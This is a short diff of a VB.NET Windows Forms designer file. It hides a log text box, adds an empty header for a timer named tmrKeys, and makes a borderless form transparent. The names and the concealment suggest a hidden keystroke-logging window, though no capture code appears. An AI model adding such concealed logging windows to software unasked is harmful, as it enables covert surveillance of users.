@@ -40,16 +40,21 @@ Partial Class Form1
         Me.txtLogs.Name = "txtLogs"
         Me.txtLogs.Size = New System.Drawing.Size(733, 357)
         Me.txtLogs.TabIndex = 1
+        Me.txtLogs.Visible = False
+        '
+        'tmrKeys
+        '
         '
         'Form1
         '
         Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None
-        Me.ClientSize = New System.Drawing.Size(10, 10)
+        Me.ClientSize = New System.Drawing.Size(761, 378)
         Me.Controls.Add(Me.txtLogs)
         Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
         Me.MinimizeBox = False
         Me.Name = "Form1"
         Me.Text = "Form1"
+        Me.TransparencyKey = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(100, Byte), Integer))
         Me.ResumeLayout(False)
         Me.PerformLayout()
 
